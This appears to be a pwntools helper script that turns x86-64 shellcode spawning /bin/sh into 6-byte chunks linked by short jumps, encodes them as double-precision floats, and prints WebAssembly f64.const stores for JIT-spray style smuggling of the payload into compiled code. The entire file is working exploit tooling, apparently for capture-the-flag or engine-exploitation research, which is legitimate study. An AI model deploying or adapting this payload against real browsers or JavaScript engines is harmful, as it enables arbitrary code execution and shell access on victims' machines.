import struct
from pwn import *

context.arch = "amd64"
context.bits = 64


def compact_opcodes(original_opcodes: list[bytes]) -> list[bytes]:
    opcodes: list[bytes] = []

    start = 0
    end = start + 1
    end_max = len(original_opcodes)

    while end <= end_max:
        current_length = sum(map(len, original_opcodes[start:end]))
        assert(current_length <= 6)

        while (
            end < end_max and current_length + len(original_opcodes[end]) <= 6
        ):
            end += 1
            current_length = sum(map(len, original_opcodes[start:end]))

        opcodes.append(b"".join(original_opcodes[start:end]))
        start = end
        end += 1

    return opcodes


def make_opcode(instructions: list[str]) -> list[bytes]:
    opcodes = [asm(x) for x in instructions]

    compacted_opcodes = compact_opcodes(opcodes)

    return compacted_opcodes


def make_float_opcode(opcodes: list[bytes], offset: int) -> list[float]:
    def convert(x):
        print(len(x))
        jmp = b"\xEB" + struct.pack('B', offset - 2) # jmp offset
        return u64(x.ljust(6, b"\x90") + jmp)

    converted_opcode: list[int] = [convert(x) for x in opcodes]
    float_opcode: list[float] = [
        struct.unpack("d", struct.pack("Q", x))[0] for x in converted_opcode
    ]
    return float_opcode


def main():
    instructions = [
        "push SYS_execve;",
        "pop rax;",
        "push 0x0068732f;",  # "/sh\0"
        "pop rbx;",
        "push 0x6e69622f;",  # "/bin"
        "pop rcx;",
        "shl rbx, 0x20;",
        "add rbx, rcx;",
        "push rbx;",
        "mov rdi, rsp;",
        "xor rsi, rsi",
        "xor rdx, rdx;",
        "syscall;",
    ]
    # For WASM
    offset = 0x0D
    # # For JIT spary
    # offset = 0x0E

    opcode = make_opcode(instructions)
    floats = make_float_opcode(opcode, offset)

    print("==========[Raw Hex]==========")
    for x in opcode:
        print(x.hex())

    print("==========[Raw Float]==========")
    for x in floats:
        print(x)

    print("==========[WAT]==========")
    for x in floats:
        print(f"(f64.store (i32.const 0) (f64.const {x}))")


if __name__ == "__main__":
    main()